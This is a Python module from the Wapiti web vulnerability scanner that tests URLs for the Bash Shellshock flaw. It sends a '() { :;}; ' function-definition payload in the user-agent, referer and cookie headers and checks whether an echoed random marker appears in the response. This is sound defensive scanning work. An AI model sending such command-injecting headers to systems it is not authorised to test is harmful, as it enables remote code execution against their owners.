#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This file is part of the Wapiti project (http://wapiti.sourceforge.io)
# Copyright (C) 2014-2020 Nicolas Surribas
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
import random
import string
from binascii import hexlify

from requests.exceptions import RequestException

from wapitiCore.attack.attack import Attack
from wapitiCore.language.vulnerability import Vulnerability, _
from wapitiCore.net import web


class mod_shellshock(Attack):
    """
    This class implements a "bash shellshock" vulnerability tester"
    """

    name = "shellshock"

    do_get = False
    do_post = False

    def __init__(self, crawler, persister, logger, attack_options):
        Attack.__init__(self, crawler, persister, logger, attack_options)
        empty_func = "() { :;}; "

        self.rand_string = "".join([random.choice(string.hexdigits) for _ in range(32)])
        hex_string = hexlify(self.rand_string.encode())
        bash_string = ""
        for i in range(0, 64, 2):
            bash_string += "\\x" + hex_string[i:i+2].decode()

        cmd = "echo; echo; echo -e '{0}';".format(bash_string)

        self.hdrs = {
            "user-agent": empty_func + cmd,
            "referer": empty_func + cmd,
            "cookie": empty_func + cmd
        }

    def attack(self):
        http_resources = self.persister.get_links(attack_module=self.name) if self.do_get else []

        for original_request in http_resources:
            try:
                url = original_request.path

                if self.verbose == 2:
                    print("[¨] {0}".format(url))

                if url not in self.attacked_get:
                    self.attacked_get.append(url)

                    evil_req = web.Request(url)

                    resp = self.crawler.send(evil_req, headers=self.hdrs)
                    if resp:
                        data = resp.content
                        if self.rand_string in data:
                            self.log_red(_("URL {0} seems vulnerable to Shellshock attack!").format(url))

                            self.add_vuln(
                                request_id=original_request.path_id,
                                category=Vulnerability.EXEC,
                                level=Vulnerability.HIGH_LEVEL,
                                request=evil_req,
                                info=_("URL {0} seems vulnerable to Shellshock attack").format(url)
                            )
            except (RequestException, KeyboardInterrupt) as exception:
                yield exception

            yield original_request
